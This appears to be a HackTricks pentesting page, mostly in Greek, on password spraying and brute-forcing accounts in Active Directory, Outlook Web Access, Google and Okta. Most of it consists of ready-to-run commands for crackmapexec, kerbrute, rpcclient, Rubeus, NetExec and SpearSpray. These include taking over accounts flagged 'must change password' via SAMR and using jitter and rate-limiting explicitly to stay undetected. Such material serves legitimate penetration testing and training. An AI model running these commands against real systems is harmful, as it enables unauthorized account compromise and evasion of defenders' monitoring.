# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Αφού βρείτε αρκετά **έγκυρα ονόματα χρήστη** μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς** (να έχετε υπόψη την πολιτική κωδικών του περιβάλλοντος) για κάθε έναν από τους εντοπισμένους χρήστες.\
Κατά **προεπιλογή** το **ελάχιστο** **μήκος** **κωδικού** είναι **7**.

Λίστες με συνηθισμένα ονόματα χρήστη μπορεί επίσης να είναι χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Σημειώστε ότι **μπορεί να κλειδώσετε κάποιους λογαριασμούς αν δοκιμάσετε πολλούς λανθασμένους κωδικούς** (κατά προεπιλογή πάνω από 10).

### Get password policy

Αν έχετε διαπιστευτήρια χρήστη ή ένα shell ως χρήστης του domain μπορείτε να **λάβετε την πολιτική κωδικών με**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation από Linux (ή όλα)

- Χρησιμοποιώντας **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Χρησιμοποιώντας [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείτε να καθορίσετε τον αριθμό προσπαθειών για να αποφύγετε αποκλεισμούς):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Χρησιμοποιώντας [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - ΔΕΝ ΣΥΝΙΣΤΑΤΑΙ, ΜΕΡΙΚΕΣ ΦΟΡΕΣ ΔΕΝ ΛΕΙΤΟΥΡΓΕΙ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Με το `scanner/smb/smb_login` module του **Metasploit**:

![](<../../images/image (745).png>)

- Χρησιμοποιώντας το **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Από Windows

- Με [Rubeus](https://github.com/Zer1t0/Rubeus) έκδοση που περιλαμβάνει το brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Με [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει χρήστες από το domain από προεπιλογή και θα ανακτήσει την πολιτική κωδικών από το domain και θα περιορίσει τις προσπάθειες ανάλογα με αυτή):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Με [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Εντοπισμός και Κατάληψη λογαριασμών "Password must change at next logon" (SAMR)

Μία τεχνική χαμηλού θορύβου είναι να κάνετε spray ένα benign/empty password και να εντοπίσετε λογαριασμούς που επιστρέφουν STATUS_PASSWORD_MUST_CHANGE, το οποίο υποδεικνύει ότι το password εξαναγκάστηκε να λήξει και μπορεί να αλλάξει χωρίς να γνωρίζετε το παλιό.

Workflow:
- Εντοπίστε χρήστες (RID brute via SAMR) για να δημιουργήσετε τη λίστα στόχων:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password και συνεχίστε με τα hits για να αποκτήσετε πρόσβαση σε λογαριασμούς που πρέπει να αλλάξουν στο next logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Για κάθε hit, αλλάξτε τον κωδικό μέσω SAMR με το NetExec’s module (δεν απαιτείται ο παλιός κωδικός όταν έχει οριστεί το "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Λειτουργικές σημειώσεις:
- Βεβαιωθείτε ότι το ρολόι του host σας είναι συγχρονισμένο με τον DC πριν από τις Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
- Ένα [+] χωρίς (Pwn3d!) σε ορισμένα modules (π.χ., RDP/WinRM) σημαίνει ότι τα creds είναι έγκυρα αλλά ο λογαριασμός δεν έχει δικαιώματα διαδραστικής σύνδεσης.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying μειώνει τον θόρυβο σε σχέση με τις προσπάθειες bind SMB/NTLM/LDAP και συμμορφώνεται καλύτερα με τις πολιτικές lockout του AD. Το SpearSpray συνδυάζει LDAP-driven targeting, έναν pattern engine και ευαισθητοποίηση πολιτικών (domain policy + PSOs + badPwdCount buffer) για να πραγματοποιεί spray με ακρίβεια και ασφάλεια. Μπορεί επίσης να επισημάνει παραβιασμένους principals στο Neo4j για pathing του BloodHound.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Στόχευση και έλεγχος προτύπων:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth και έλεγχοι ασφάλειας:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound εμπλουτισμός:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Επισκόπηση συστήματος προτύπων (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Προτιμήστε το query στον PDC-emulator με -dc για να διαβάσετε το πιο αξιόπιστο badPwdCount και πληροφορίες σχετικές με πολιτικές.
- Οι επαναφορές του badPwdCount ενεργοποιούνται στην επόμενη προσπάθεια μετά το παράθυρο παρατήρησης· χρησιμοποιήστε όριο και χρονισμό για να παραμείνετε ασφαλείς.
- Οι προσπάθειες pre-auth του Kerberos εμφανίζονται ως 4768/4771 στην DC telemetry· χρησιμοποιήστε jitter και rate-limiting για να περάσετε απαρατήρητοι.

> Tip: Το προεπιλεγμένο LDAP page size του SpearSpray είναι 200· προσαρμόστε με -lps αν χρειάζεται.

## Outlook Web Access

Υπάρχουν πολλαπλά εργαλεία για p**assword spraying outlook**.

- Με [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- με [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Με [Ruler](https://github.com/sensepost/ruler) (αξιόπιστο!)
- Με [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Με [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και έναν κωδικό / μια μικρή λίστα κωδικών για να κάνετε spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Αναφορές

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
